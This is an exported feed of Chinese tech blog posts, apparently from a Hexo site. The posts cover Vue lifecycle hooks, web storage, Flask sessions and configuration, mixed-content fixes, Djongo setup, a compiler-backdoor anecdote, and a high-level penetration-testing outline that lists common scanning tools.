<p>然后通过openid可以找到用户，然后生成对应的token或者session_id，然后发送给客户端保存起来。<br>每次请求，需要客户端在request的请求头中带上存储在localstorage中的session_id或者token，发送给后端，后端根据算法解密来验证是否合法。</p>
<p>另一种方法，可以将session_key直接传给客户端保存起来也是可以的。</p>
<p>注意，为了防止泄露，session和token有生存时间，需要前端定时刷新获取或者重新获取。</p>
]]></content>
      <categories>
        <category>小程序</category>
      </categories>
      <tags>
        <tag>小程序登录</tag>
      </tags>
  </entry>
  <entry>
    <title>MVVM的理解和Vue的生命周期</title>
    <url>/2020/04/14/vue-4/</url>
    <content><![CDATA[<p>MVVM 前端的方向</p>
<a id="more"></a>
<h1 id="mvvm定义"><a href="#mvvm定义" class="headerlink" title="mvvm定义"></a>mvvm定义</h1><p>MVVM 是 Model-View-ViewModel 的缩写。<br>Model代表数据模型，也可以在Model中定义数据修改和操作的业务逻辑。<br>View 代表UI 组件，它负责将数据模型转化成UI 展现出来。<br>ViewModel 监听模型数据的改变和控制视图行为、处理用户交互，简单理解就是一个同步View 和 Model的对象，连接Model和View。<br>在MVVM架构下，View 和 Model 之间并没有直接的联系，而是通过ViewModel进行交互，Model 和 ViewModel 之间的交互是双向的， 因此View 数据的变化会同步到Model中，而Model 数据的变化也会立即反应到View 上。<br>ViewModel 通过双向数据绑定把 View 层和 Model 层连接了起来，而View 和 Model 之间的同步工作完全是自动的，无需人为干涉，因此开发者只需关注业务逻辑，不需要手动操作DOM, 不需要关注数据状态的同步问题，复杂的数据状态维护完全由 MVVM 来统一管理。</p>
<h1 id="vue生命周期"><a href="#vue生命周期" class="headerlink" title="vue生命周期"></a>vue生命周期</h1><p>beforeCreate（创建前） 在数据观测和初始化事件还未开始<br>created（创建后） 完成数据观测，属性和方法的运算，初始化事件，$el属性还没有显示出来<br>beforeMount（载入前） 在挂载开始之前被调用，相关的render函数首次被调用。实例已完成以下的配置：编译模板，把data里面的数据和模板生成html。注意此时还没有挂载html到页面上。<br>mounted（载入后） 在el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用。实例已完成以下的配置：用上面编译好的html内容替换el属性指向的DOM对象。完成模板中的html渲染到html页面中。此过程中进行ajax交互。<br>beforeUpdate（更新前） 在数据更新之前调用，发生在虚拟DOM重新渲染和打补丁之前。可以在该钩子中进一步地更改状态，不会触发附加的重渲染过程。<br>updated（更新后） 在由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。调用时，组件DOM已经更新，所以可以执行依赖于DOM的操作。然而在大多数情况下，应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。<br>beforeDestroy（销毁前） 在实例销毁之前调用。实例仍然完全可用。<br>destroyed（销毁后） 在实例销毁之后调用。调用后，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。<br>1.什么是vue生命周期？<br>答： Vue 实例从创建到销毁的过程，就是生命周期。从开始创建、初始化数据、编译模板、挂载Dom→渲染、更新→渲染、销毁等一系列过程，称之为 Vue 的生命周期。</p>
<p>2.vue生命周期的作用是什么？<br>答：它的生命周期中有多个事件钩子，让我们在控制整个Vue实例的过程时更容易形成好的逻辑。</p>
<p>3.vue生命周期总共有几个阶段？<br>答：它可以总共分为8个阶段：创建前/后, 载入前/后,更新前/后,销毁前/销毁后。</p>
<p>4.第一次页面加载会触发哪几个钩子？<br>答：会触发 下面这几个beforeCreate, created, beforeMount, mounted 。</p>
<p>5.DOM 渲染在 哪个周期中就已经完成？<br>答：DOM 渲染在 mounted 中就已经完成了。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/29/vue-8/">vue配置文件config说明</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-7/">vue字符串截取字符串str切片处理办法</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-6/">node-sass安装失败解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/25/vue-5/">vue项目一直运行 /sockjs-node/info?t= 解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/13/vue-3/">vue的Mixed Content：The page at ‘https://XXX’ was loaded over HTTPS, but requested an insecure</a></li></ul></div>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>localStorage和sessionStorage区别和相同点</title>
    <url>/2020/04/14/html-1/</url>
    <content><![CDATA[<p>html5的localStorage和sessionStorage区别和相同点<br><a id="more"></a></p>
<ul>
<li><p>localStorage和sessionStorage是html5中的Web Storage的两种方式。</p>
</li>
<li><p>localStorage和sessionStorage一样都是用来存储客户端临时信息的对象。</p>
</li>
<li><p>sessionStorage用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问<br>并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，是会话级别的存储。只允许同一窗口访问。</p>
</li>
<li><p>而localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。同源可以读取并修改localStorage数据。</p>
</li>
<li><p>储存的对象类型均为字符串类型；</p>
</li>
</ul>
]]></content>
      <categories>
        <category>html5</category>
      </categories>
      <tags>
        <tag>html5</tag>
      </tags>
  </entry>
  <entry>
    <title>session和cookie的区别和相同点</title>
    <url>/2020/04/14/flask-4/</url>
    <content><![CDATA[<p>session和cookie概念理解<br><a id="more"></a></p>
<p>http协议是不记录状态的，所以无法断定一个用户是否登录还是未登录，像现在的app使用的token一样，html网页的状态也是通过token一样的secretkey去保存登录状态的，所以session诞生了并且存储在cookie当中。<br><img src="https://i.postimg.cc/mkRjRspg/image.png" alt><br>session不一定存储在服务器上，尽管放在服务器更加安全，把所有信息放在浏览器的cookie中也是可以的，flask默认的session就是放在客户端的，而不是session_id+服务器的形式。</p>
<p><img src="https://i.postimg.cc/0NXh8ZLw/image.png" alt></p>
<p>通过改写或者使用flask-session可以实现session信息存储在服务器上。</p>
<p>而现在流行大前端的形式，采用token的形式来记录状态，我们可以使用jwt或者其他形式的token。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-emoji/">flask如何在mysql中储存emoji表情</a></li><li><a href="https://thelighter.github.io/2020/05/17/flask-http-https/">flask的http和https的重定向和https强制使用办法</a></li><li><a href="https://thelighter.github.io/2020/04/29/flask-5/">python flask 数据库乐观锁</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-3/">flask的session用法和常识</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-2/">flask常用配置，flask配置文件config.py</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>vue的Mixed Content：The page at ‘https://XXX’ was loaded over HTTPS, but requested an insecure</title>
    <url>/2020/04/13/vue-3/</url>
    <content><![CDATA[<p>Mixed Content: The page at ‘<a href="https://XXX’" target="_blank" rel="noopener">https://XXX’</a> was loaded over HTTPS, but requested an insecure报错解决<br><a id="more"></a></p>
<h1 id="问题产生"><a href="#问题产生" class="headerlink" title="问题产生"></a>问题产生</h1><ul>
<li>HTTPS页面中引入HTTP资源.</li>
<li>在HTTPS页面里通过ajax的方式请求HTTP资源</li>
</ul>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>html页面中head加上这条<br><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-insecure-requests&quot;&gt;</code></p>
<p>或者<br>回服务器应头中加上这个<br>header(“Content-Security-Policy: upgrade-insecure-requests”);</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/29/vue-8/">vue配置文件config说明</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-7/">vue字符串截取字符串str切片处理办法</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-6/">node-sass安装失败解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/25/vue-5/">vue项目一直运行 /sockjs-node/info?t= 解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/14/vue-4/">MVVM的理解和Vue的生命周期</a></li></ul></div>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>flask的session用法和常识</title>
    <url>/2020/04/13/flask-3/</url>
    <content><![CDATA[<p>一文掌握flask的session用法<br><a id="more"></a></p>
<p>session操作像字典一样</p>
<p>flask的session是使用werkzeug的SecureCookie，它通过secretkey加密session是加密后保存在客户端的<br>不像django一样session默认保存到数据库，当然可以通过修改flask接口实现保存在数据库（redis,memcached,mysql）</p>
<p>详情请见——<a href="https://www.cnblogs.com/brifuture/p/9851000.html" target="_blank" rel="noopener">https://www.cnblogs.com/brifuture/p/9851000.html</a></p>
<h1 id="flask默认session操作"><a href="#flask默认session操作" class="headerlink" title="flask默认session操作"></a>flask默认session操作</h1><ul>
<li>session删除某一字段<br>session.pop(“user”, None)</li>
<li>session设置值<br>session[“user”] = ‘wxw’</li>
<li>session获取值<br>session.get(‘username’)或者是session[“username”]</li>
<li>清除session<br>session.clear</li>
</ul>
<p>如果没有指定session的过期时间，那么默认是浏览器关闭后就自动结束<br>如果设置了session的permanent属性为True，那么过期时间是31天。<br>可以通过给app.config设置PERMANENT_SESSION_LIFETIME来更改过期时间，这个值的数据类型是datetime.timedelay类型。</p>
<p><code>app.config[&#39;PERMANENT_SESSION_LIFETIME&#39;] = timedelta(days=7)</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&apos;/session&apos;)</span><br><span class="line">def set_session():</span><br><span class="line">    session[&apos;username&apos;] = &apos;wxw&apos;</span><br><span class="line">    session.permanent = True</span><br></pre></td></tr></table></figure></p>
<p>flask的session是使用werkzeug的SecureCookie，它通过secretkey加密session是加密后保存在客户端的<br>不像django一样session默认保存到数据库，当然可以通过修改flask接口实现保存在数据库（redis,memcached,mysql）<br>详情请见——<a href="https://www.cnblogs.com/brifuture/p/9851000.html" target="_blank" rel="noopener">https://www.cnblogs.com/brifuture/p/9851000.html</a></p>
<h1 id="flask-session模块用法"><a href="#flask-session模块用法" class="headerlink" title="flask_session模块用法"></a>flask_session模块用法</h1><p>通过这个模块可以改变flask默认session保存在浏览器的弊端，实现session保存在redis、mongodb、mysql和file中。</p>
<p>常用配置<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.config[&apos;SESSION_TYPE&apos;] = &apos;sqlalchemy&apos;  # session类型为sqlalchemy、reids、filesystem、memcached、mongodb</span><br><span class="line">app.config[&apos;SESSION_PERMANENT&apos;] = True  # 如果设置为True，则关闭浏览器session就失效。</span><br><span class="line">app.config[&apos;SESSION_USE_SIGNER&apos;] = False  # 是否对发送到浏览器上session的cookie值进行加密</span><br><span class="line">app.config[&apos;SESSION_KEY_PREFIX&apos;] = &apos;session:&apos;  # 保存到session中的值的前缀</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.config[&apos;SESSION_SQLALCHEMY&apos;] = db # SQLAlchemy对象</span><br><span class="line">app.config[&apos;SESSION_SQLALCHEMY_TABLE&apos;] = &apos;session&apos; # session要保存的表名称</span><br><span class="line"></span><br><span class="line">app.config[&apos;SESSION_REDIS&apos;] = redis.Redis(host=&apos;127.0.0.1&apos;, port=&apos;6379&apos;, password=&apos;123123&apos;)  # 用于连接redis的配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.config[&apos;SESSION_MONGODB_DB&apos;] = &apos;mongo的db名称（数据库名称）&apos;</span><br><span class="line">app.config[&apos;SESSION_MONGODB_COLLECT&apos;] = &apos;mongo的collect名称（表名称）&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.config[&apos;SESSION_FILE_THRESHOLD&apos;] = 500  # 存储session的个数如果大于这个值时，就要开始进行删除了</span><br><span class="line">app.config[&apos;SESSION_FILE_MODE&apos;] = 384  # 文件权限类型</span><br></pre></td></tr></table></figure></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-emoji/">flask如何在mysql中储存emoji表情</a></li><li><a href="https://thelighter.github.io/2020/05/17/flask-http-https/">flask的http和https的重定向和https强制使用办法</a></li><li><a href="https://thelighter.github.io/2020/04/29/flask-5/">python flask 数据库乐观锁</a></li><li><a href="https://thelighter.github.io/2020/04/14/flask-4/">session和cookie的区别和相同点</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-2/">flask常用配置，flask配置文件config.py</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>flask常用配置，flask配置文件config.py</title>
    <url>/2020/04/13/flask-2/</url>
    <content><![CDATA[<p>flask配置项<br><a id="more"></a></p>
<ul>
<li>DEBUG    启用/禁用调试模式</li>
<li>TESTING    启用/禁用测试模式</li>
<li>PROPAGATE_EXCEPTIONS    显式地允许或禁用异常的传播。如果没有设置或显式地设置为 None ，当 TESTING 或 DEBUG 为真时，这个值隐式地为 true.</li>
<li>PRESERVE_CONTEXT_ON_EXCEPTION    默认情况下，如果应用工作在调试模式，请求上下文不会在异常时出栈来允许<em>调试器内省。 这可以通过这个键来禁用。你同样可以用这个设定来强制启用它，即使没有调试执行，这对调试生产应</em>用很有用（但风险也很大）</li>
<li>SECRET_KEY    密钥</li>
<li>SESSION_COOKIE_NAME    会话 cookie 的名称。</li>
<li>SESSION_COOKIE_DOMAIN    会话 cookie 的域。如果不设置这个值，则 cookie 对 SERVER_NAME 的全部子域名有效</li>
<li>SESSION_COOKIE_PATH    会话 cookie 的路径。如果不设置这个值，且没有给 ‘/‘ 设置过，则 cookie 对 * APPLICATION_ROOT 下的所有路径有效。</li>
<li>SESSION_COOKIE_HTTPONLY    控制 cookie 是否应被设置 httponly 的标志， 默认为 True</li>
<li>SESSION_COOKIE_SECURE    控制 cookie 是否应被设置安全标志，默认为 False</li>
<li>PERMANENT_SESSION_LIFETIME    以 datetime.timedelta 对象控制长期会话的生存时间。从 Flask 0.8 开始，也可以用整数来表示秒。</li>
<li>SESSION_REFRESH_EACH_REQUEST    这个标志控制永久会话如何刷新。如果被设置为 True （这是默认值），每一个请求 cookie 都会被刷新。如果设置为 False ，只有当 cookie 被修改后才会发送一个 set-cookie 的标头。*非永久会话不会受到这个配置项的影响 。</li>
</ul>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-emoji/">flask如何在mysql中储存emoji表情</a></li><li><a href="https://thelighter.github.io/2020/05/17/flask-http-https/">flask的http和https的重定向和https强制使用办法</a></li><li><a href="https://thelighter.github.io/2020/04/29/flask-5/">python flask 数据库乐观锁</a></li><li><a href="https://thelighter.github.io/2020/04/14/flask-4/">session和cookie的区别和相同点</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-3/">flask的session用法和常识</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言如何实现</title>
    <url>/2020/02/22/joke-3/</url>
    <content><![CDATA[<p>如何实现C语言<br><a id="more"></a></p>
<h1 id="c语言产生"><a href="#c语言产生" class="headerlink" title="c语言产生"></a>c语言产生</h1><p>机器只认机器语言（机器代码），为了提高效率产生了汇编语言，通过汇编语言去编写机器代码<br>然后通过汇编语言作为编译器来实现C语言<br>Java的虚拟机也是通过C语言和汇编语言来实现的</p>
<h1 id="关于编译器，这里边有个有趣的传说"><a href="#关于编译器，这里边有个有趣的传说" class="headerlink" title="关于编译器，这里边有个有趣的传说"></a>关于编译器，这里边有个有趣的传说</h1><p>传说Unix 发明人之一的 Ken Thompson在贝尔实验室，大摇大摆的走到任何一台Unix机器前，输入自己的用户名和密码，就能以root的方式登录！ </p>
<p>贝尔实验室人才济济，另外一些大牛发誓要把这个漏洞找出来，他们通读了Unix的C源码，终于找到了登录的后门，清理后门以后编译Unix , 运行，可是Thompson 还是能够登录进去。</p>
<p>有人觉得可能是编译器中有问题，在编译Unix的时候植入了后门，于是他们又用C语言重新写了一个编译器，用新的编译器再次编译了Unix，这下总算天下太平了吧。</p>
<p>可是仍然不管用，Thompson 依然可以用root登录，真是让人崩溃 ！</p>
<p>后来Thompson 本人解开了秘密，是第一个C 语言编译器有问题，这个编译器在编译Unix源码的时候，当然会植入后门，这还不够，更牛的是，如果你用C 语言写了一个新编译器，肯定也需要编译成二进制代码啊，用什么来编译，只有用Thompson写的那第一个编译器来编译，好了，你写的这个编译器就会被污染了，你的编译器再去编译Unix , 也会植入后门 :-)</p>
<p>说到这里我就想起了几年前的XcodeGhost 事件，简单来说就是在Xcode（非官方渠道下载的）中植入了木马，这样XCode编译出的iOS App都被污染了，这些App就可以被黑客利用做非法之事。 </p>
<p>虽然这个XCodeGhost和Thompson的后面相比差得远，但是提醒我们，下载软件的时候要走正规渠道，从官方网站下载，认准网站的HTTPS标准，甚至可以验证一下checksum。</p>
<h1 id="自举"><a href="#自举" class="headerlink" title="自举"></a>自举</h1><p>可能有人问：我用汇编写一段Hello World都很麻烦，居然有人可以用它写复杂的编译器？这可能吗？</p>
<p>当然可能，在开发第一代Unix的时候，连C语言都没有，Ken Thompson 和 Dennis Ritchie 可是用汇编一行行把Unix敲出来的。WPS第一版是求伯君用汇编写出来的，Turbo Pascal 的编译器也是Anders 用汇编写出来的，大神们的能力不是普通人能想象得到的。 </p>
<p>对于编译器来说，还可以采用“滚雪球”的方式来开发：</p>
<p>还是以C语言为例，第一个版本可以先选择C语言的一个子集，例如只支持基本的数据类型，流程控制语句，函数调用…… 我们把这个子集称为C0。</p>
<p>然后用汇编语言写个编译器，只搞定这个语言的子集C0，这样写起来就容易不少。</p>
<p>C0这个语言可以工作了，然后我们扩展这个子集，例如添加struct，指针…..把新的语言称为C1。 </p>
<p>那C1这个语言的编译器由谁来写？自然是C0。</p>
<p>等到C1可以工作了，再次扩展语言特性，用C1写编译器，得到C2。 </p>
<p>然后是C3、C4……最后得到完整的C语言。</p>
<p>这个过程被称为bootstraping ， 中文叫做自举。</p>
]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>互联网上超过40％的流量都是假的</title>
    <url>/2020/02/22/joke-2/</url>
    <content><![CDATA[<p>互联网上超过40％的流量都是假的<br><a id="more"></a></p>
<p>两周前，国内营销界发生了一件大事：甲方委托微博某流量头部机构做推广。结果是：产品获得了353万次的观看，上千的评论，上千的点赞，但实际交易量为零，被引进甲方店铺的流量也近乎为零。</p>
<p>虽然很多时候，产品的曝光率与转化率确实是两回事，但后来甲方撰文讨伐时暗指的这个“假流量”，究竟在全球互联网流量棋局中占有一个什么样的位置呢？<br>在数字世界里，有约20%的广告，不是由真实的人“看到”的。</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mjc1NjM3MjY2MA==&amp;mid=2691374672&amp;idx=1&amp;sn=4555aa283978aa138b228ce93ea1c070&amp;chksm=a9eaa18b9e9d289da5d0d37ca189e3b96b2a4a28f6dbf264745476ff3700e6f74565b8cb5ce5&amp;mpshare=1&amp;srcid=&amp;sharer_sharetime=1572759469153&amp;sharer_shareid=755d88619b96652588dd5246cecb95e3&amp;from=timeline&amp;scene=2&amp;subscene=1&amp;clicktime=1572760686&amp;enterid=1572760686&amp;key=ca45bf86846e98572774be228a75abc2730b218eb26cf2ae4503a6cff6e858ca5a6068b172355e0f3aa68f8671bd3a11e254222c429671d64bdf67f116ba1957a850c367a7cbb1bc0c7ccf19f2a2f2b7&amp;ascene=1&amp;uin=MjgxOTU5NDgwNg%3D%3D&amp;devicetype=Windows+10&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=A0S9EuW%2Bq74X3BSoI%2FcDXy4%3D&amp;pass_ticket=slkXpxzhm8vwLxD5lOStn47EaysKIZeQReA2QxNm3y04tgXGXfWL%2Bg8mWZsMNxsu" target="_blank" rel="noopener">原文地址</a></p>
]]></content>
  </entry>
  <entry>
    <title>互联网黑话——程序员必会</title>
    <url>/2020/02/22/joke-1/</url>
    <content><![CDATA[<p>天王盖地虎 宝塔镇河妖 互联网的黑话你懂几句<br><a id="more"></a></p>
<h1 id="老板"><a href="#老板" class="headerlink" title="老板"></a>老板</h1><p>市场很大 = 我还不知道怎么赚钱<br>有一定的用户基础 = 建立了 QQ 群和微信群<br>自主研发的系统 = XXX 开源代码二次开发的<br>采用了大数据技术 = Nginx 日志开起来了，怎么用以后再说<br>采用了云技术 = 买了几台 ECS<br>。。。</p>
<h1 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h1><p>在吗？= 有个需求需要改一下<br>没有我要的那种感觉 = 抄下苹果<br>我下去再确认一下=这个老子没想到，别说了<br>设计应该大道至简 = 复杂的我也不会<br>商业模式要形成闭环 = 放东西线上卖<br>。。。</p>
<h1 id="程序员"><a href="#程序员" class="headerlink" title="程序员"></a>程序员</h1><p>在吗？= 今天做不完<br>你这个需求不清晰 = 我不想做<br>目前技术实现不了 = 我不想做<br>现在服务器性能跟不上 = 我不想做<br>这个太复杂了 = 我不想做</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDIzNzY1OQ==&amp;mid=2735614899&amp;idx=1&amp;sn=cf38f5c2eb4c81cabae67bc3c0200e62&amp;chksm=b6ab2d0781dca411a00d0e1f7aac724d98fae9f9137ba69814ca52ea0acd15258fac88d857da&amp;mpshare=1&amp;scene=24&amp;srcid=1113w8zAdENwSFpC1mNPN64H&amp;sharer_sharetime=1573607886898&amp;sharer_shareid=23877c29361fac44b44fa346073b74de&amp;key=3503aa848b16fe5b9544708d038afdcaa42d413f409f9d564172dd55c14a8c69b8226dc2dff05d8ac85eb557f77256277db6ed7e9723632c8d430254c7015790d2909d657ba2b1ebb55a50e751cc437e&amp;ascene=1&amp;uin=MjgxOTU5NDgwNg%3D%3D&amp;devicetype=Windows+10&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=A7EkGblFV3E00j%2BRgyHtIY4%3D&amp;pass_ticket=slkXpxzhm8vwLxD5lOStn47EaysKIZeQReA2QxNm3y04tgXGXfWL%2Bg8mWZsMNxsu" target="_blank" rel="noopener">原文地址</a></p>
]]></content>
  </entry>
  <entry>
    <title>渗透的方法和思路</title>
    <url>/2020/02/22/sentou-1/</url>
    <content><![CDATA[<p>渗透方法轿车</p>
<a id="more"></a>
<h1 id="常用的渗透思路"><a href="#常用的渗透思路" class="headerlink" title="常用的渗透思路"></a>常用的渗透思路</h1><ol>
<li>侦察和信息收集阶段对应用程序进行各种信息的收集，包括但不限于服务器信息（操作系统、开放端口、运行的服务）、应用信息（应用架构、脚本类型）</li>
<li>映射应用内容</li>
<li>漏洞扫描和发现</li>
<li>对应用陈程序进行漏洞扫描以发现其中的漏洞漏洞利用对发现的漏洞进行利用并获得权限。</li>
</ol>
<h1 id="渗透入手方向"><a href="#渗透入手方向" class="headerlink" title="渗透入手方向"></a>渗透入手方向</h1><ul>
<li>配置和部署管理测试</li>
<li>身份管理测试</li>
<li>认证测试</li>
<li>授权测试</li>
<li>会话管理测试</li>
</ul>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="漏洞扫描器"><a href="#漏洞扫描器" class="headerlink" title="漏洞扫描器"></a>漏洞扫描器</h2><ul>
<li>w3af：一个Web应用程序攻击和检查框架。</li>
<li>arachni：一个用ruby语言编写的针对web应用的安全漏洞扫描软件，可以扫描很多类型的漏洞。</li>
<li><p>Acunetix Web Vulnerability Scanner：一个自动化的Web应用安全测试工具，通过爬虫测试网站安全，检查流行的安全漏洞。</p>
<h2 id="暴力资源定位器"><a href="#暴力资源定位器" class="headerlink" title="暴力资源定位器"></a>暴力资源定位器</h2><p>用于有目的性的发现应用中的诸如文件、目录等私密的内容和资源。</p>
</li>
<li><p>DIRB</p>
</li>
<li>Wfuzz</li>
<li>Fuzzdb</li>
</ul>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/13/scrapy-attack/">scrapy框架攻击</a></li></ul></div>]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>django中如何使用Djongo</title>
    <url>/2020/02/22/django-djongo/</url>
    <content><![CDATA[<p>django中如何使用Djongo<br><a id="more"></a></p>
<h1 id="使用第三方模块可以实现mongo的使用"><a href="#使用第三方模块可以实现mongo的使用" class="headerlink" title="使用第三方模块可以实现mongo的使用"></a>使用第三方模块可以实现mongo的使用</h1><p><code>pip install djongo</code></p>
<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">   &apos;default&apos;: &#123;</span><br><span class="line">      &apos;ENGINE&apos;: &apos;djongo&apos;,</span><br><span class="line">      &apos;ENFORCE_SCHEMA&apos;: True,</span><br><span class="line">      &apos;NAME&apos;: &apos;your-db-name&apos;,</span><br><span class="line">      &apos;HOST&apos;: &apos;host-name or ip address&apos;,</span><br><span class="line">      &apos;PORT&apos;: port_number,</span><br><span class="line">      &apos;USER&apos;: &apos;db-username&apos;,</span><br><span class="line">      &apos;PASSWORD&apos;: &apos;password&apos;,</span><br><span class="line">      &apos;AUTH_SOURCE&apos;: &apos;db-name&apos;,</span><br><span class="line">      &apos;AUTH_MECHANISM&apos;: &apos;SCRAM-SHA-1&apos;,</span><br><span class="line">      &apos;REPLICASET&apos;: &apos;replicaset&apos;,</span><br><span class="line">      &apos;SSL&apos;: &apos;ssl&apos;,</span><br><span class="line">      &apos;SSL_CERTFILE&apos;: &apos;ssl_certfile&apos;,</span><br><span class="line">      &apos;SSL_CA_CERTS&apos;: &apos;ssl_ca_certs&apos;,</span><br><span class="line">      &apos;READ_PREFERENCE&apos;: &apos;read_preference&apos;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="定义model"><a href="#定义model" class="headerlink" title="定义model"></a>定义model</h1><p><code>from djongo import models</code><br>然后，就可以按照Django的方式来定义模型了。在这里，我们定义了一个News()模型，用于存储新闻：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class News(models.Model):</span><br><span class="line">    title = models.CharField(verbose_name=&quot;标题&quot;,max_length=50)</span><br><span class="line">    author = models.CharField(verbose_name=&quot;作者&quot;,max_length=10)</span><br><span class="line">    desc = models.CharField(verbose_name=&quot;简介&quot;,max_length=100)</span><br><span class="line">    content = models.TextField(verbose_name=&quot;正文&quot;)</span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=True)</span><br><span class="line">    update_time = models.DateTimeField(auto_now=True,auto_now_add=True)</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.title</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name = &apos;新闻&apos;</span><br><span class="line">        verbose_name_plural = verbose_name</span><br></pre></td></tr></table></figure></p>
<h1 id="djongo官网"><a href="#djongo官网" class="headerlink" title="djongo官网"></a>djongo官网</h1><p>djongo官网 <a href="https://nesdis.github.io/djongo/" target="_blank" rel="noopener">https://nesdis.github.io/djongo/</a><br>GitHub项目地址 <a href="https://github.com/nesdis/djongo/" target="_blank" rel="noopener">https://github.com/nesdis/djongo/</a></p>
]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>Djongo</tag>
      </tags>
  </entry>
  <entry>
    <title>让机器辨别气味：利用图神经网络预测分子的嗅觉属性</title>
    <url>/2020/02/22/ai-1/</url>
    <content><![CDATA[<p>让机器辨别气味：利用图神经网络预测分子的嗅觉属性<br><a id="more"></a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAwODY4OTk2Mg==&amp;mid=2652051808&amp;idx=1&amp;sn=264ebf524a38333aaf2b07a9b1cbea29&amp;chksm=808cb925b7fb303368d26dd3eca182b208f76a9c86618917e015f7084decf62f21d7e39d6c19&amp;mpshare=1&amp;scene=24&amp;srcid=1210PXQCpzurB7RpnunuBUNQ&amp;sharer_sharetime=1575971312672&amp;sharer_shareid=23877c29361fac44b44fa346073b74de&amp;key=008658d21f0cfb814f043e598881077b5b21402fe39fee2fe53ab3543da8803a906aabb00b484696e5d7ed7aa1cd2e025c16902a334901a1d73148073af96b6154df650b55b911910c4942b446a4e6f5&amp;ascene=1&amp;uin=MjgxOTU5NDgwNg%3D%3D&amp;devicetype=Windows+10&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=A7fa0AhBNgTTDV1U9QEz6vU%3D&amp;pass_ticket=slkXpxzhm8vwLxD5lOStn47EaysKIZeQReA2QxNm3y04tgXGXfWL%2Bg8mWZsMNxsu" target="_blank" rel="noopener">原文地址</a> </p>
<h1 id="嗅觉原理"><a href="#嗅觉原理" class="headerlink" title="嗅觉原理"></a>嗅觉原理</h1><p>嗅觉是诸多生物体共有的一种感官，在生物体分析世界并作出相应反应方面起着至关重要的作用。对人类而言，我们的嗅觉与享用美食紧密相连，并且还能唤醒与之对应的鲜活记忆。嗅觉使我们可以感受日常生活中的各种香味，例如我们熟悉的玫瑰花香、新鲜出炉的饼干醇香，抑或是最喜欢的香水味道。虽然嗅觉很重要，但在机器学习研究中它并未像视觉与听觉那般备受关注。</p>
